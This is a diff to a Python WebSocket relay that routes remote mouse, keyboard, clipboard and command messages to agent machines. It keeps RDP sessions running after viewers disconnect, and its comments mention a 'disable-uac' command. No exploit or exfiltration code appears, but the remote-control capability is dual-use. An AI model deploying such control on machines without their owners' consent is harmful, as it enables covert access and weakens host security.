@@ -73,8 +73,20 @@ class PubSubManager:
             channel = channel.decode()
 
         if channel.startswith("ctrl:to:"):
+            # Commands to MAIN process (stop-rdp, disable-uac, etc)
             aid = channel[8:]
             ws = HUB.agent_ws.get(aid)
+            if ws:
+                try:
+                    text = data.decode() if isinstance(data, bytes) else data
+                    await ws.send_text(text)
+                except Exception:
+                    pass
+
+        elif channel.startswith("ctrl:worker:"):
+            # Commands to WORKER process (mouse, keyboard, etc)
+            aid = channel[12:]
+            ws = HUB.worker_ws.get(aid)
             if ws:
                 try:
                     text = data.decode() if isinstance(data, bytes) else data
@@ -263,7 +275,8 @@ class AgentState:
 
 class ControlHub:
     def __init__(self):
-        self.agent_ws: Dict[str, WebSocket] = {}
+        self.agent_ws: Dict[str, WebSocket] = {}      # Main process (commands)
+        self.worker_ws: Dict[str, WebSocket] = {}     # Worker process (mouse/keyboard)
         self.viewer_ws: Dict[str, Set[WebSocket]] = {}
         self.agent_hello: Dict[str, str] = {}
 
@@ -488,6 +501,48 @@ async def ws_control_agent(ws: WebSocket, aid: str):
         logger.info(f"[relay] agent disconnected: {aid} worker={WORKER_ID}")
 
 
+@router.websocket("/ws/control/worker/{aid}")
+async def ws_control_worker(ws: WebSocket, aid: str):
+    """Worker process connection - for mouse/keyboard commands"""
+    await ws.accept()
+    try:
+        sock = ws._transport.get_extra_info('socket')  # type: ignore[attr-defined]
+        if sock:
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    except Exception:
+        pass
+    
+    # Register worker for mouse/keyboard commands
+    old = HUB.worker_ws.get(aid)
+    if old is not None:
+        try:
+            await old.close()
+        except Exception:
+            pass
+    HUB.worker_ws[aid] = ws
+    
+    logger.info(f"[relay] worker connected: {aid} worker={WORKER_ID}")
+    try:
+        while True:
+            msg = await ws.receive_text()
+            # Worker sends log/status messages, forward to status channel only
+            try:
+                obj = json.loads(msg)
+                if obj.get("type") == "status":
+                    # Publish worker status to browsers
+                    await PS_MANAGER.publish(f"worker:status:{aid}", msg)
+            except Exception:
+                pass
+    except WebSocketDisconnect:
+        pass
+    except Exception as e:
+        logger.error(f"[relay] worker {aid}: {e}")
+    finally:
+        if HUB.worker_ws.get(aid) is ws:
+            HUB.worker_ws.pop(aid, None)
+        logger.info(f"[relay] worker disconnected: {aid}")
+
+
 @router.websocket("/ws/control/viewer/{aid}")
 async def ws_control_viewer(ws: WebSocket, aid: str):
     await ws.accept()
@@ -516,7 +571,23 @@ async def ws_control_viewer(ws: WebSocket, aid: str):
     try:
         while True:
             msg = await ws.receive_text()
-            await PS_MANAGER.publish(f"ctrl:to:{aid}", msg)
+            try:
+                obj = json.loads(msg)
+                msg_type = obj.get("type", "")
+                
+                # Mouse/keyboard/clipboard go to WORKER
+                if msg_type in ("mouse_move", "mouse_down", "mouse_up", "mouse_wheel", 
+                               "text", "key_down", "key_up", "clipboard"):
+                    await PS_MANAGER.publish(f"ctrl:worker:{aid}", msg)
+                # Commands (stop-rdp, disable-uac, etc) go to MAIN
+                elif msg_type == "command":
+                    await PS_MANAGER.publish(f"ctrl:to:{aid}", msg)
+                else:
+                    # Unknown message type, send to main for safety
+                    await PS_MANAGER.publish(f"ctrl:to:{aid}", msg)
+            except Exception:
+                # Malformed JSON - send to main as-is
+                await PS_MANAGER.publish(f"ctrl:to:{aid}", msg)
     except WebSocketDisconnect:
         pass
     except Exception as e:
@@ -525,22 +596,11 @@ async def ws_control_viewer(ws: WebSocket, aid: str):
         s = HUB.viewer_ws.get(aid)
         if s is not None:
             s.discard(ws)
-        
-        # ===== Auto-stop RDP if no more viewers =====
-        remaining_viewers = HUB.viewer_ws.get(aid)
-        if not remaining_viewers or len(remaining_viewers) == 0:
-            logger.info(f"[relay] No more viewers for {aid}, sending stop-rdp-worker command")
-            agent_ws = HUB.agent_ws.get(aid)
-            if agent_ws:
-                try:
-                    stop_cmd = json.dumps({
-                        "type": "command",
-                        "cmd": "stop-rdp-worker",
-                    })
-                    await agent_ws.send_text(stop_cmd)
-                    logger.info(f"[relay] Sent stop-rdp-worker to {aid}")
-                except Exception as e:
-                    logger.error(f"[relay] Failed to send stop-rdp to {aid}: {e}")
+        # NOTE: Do NOT auto-stop RDP when last viewer disconnects!
+        # Worker lifecycle is managed only by dashboard or API calls,
+        # not by viewer connections. Multiple viewers can connect/disconnect
+        # independently without affecting the RDP session.
+        logger.info(f"[relay] viewer disconnected: {aid}")
 
 
 # ============ CONFIG ============
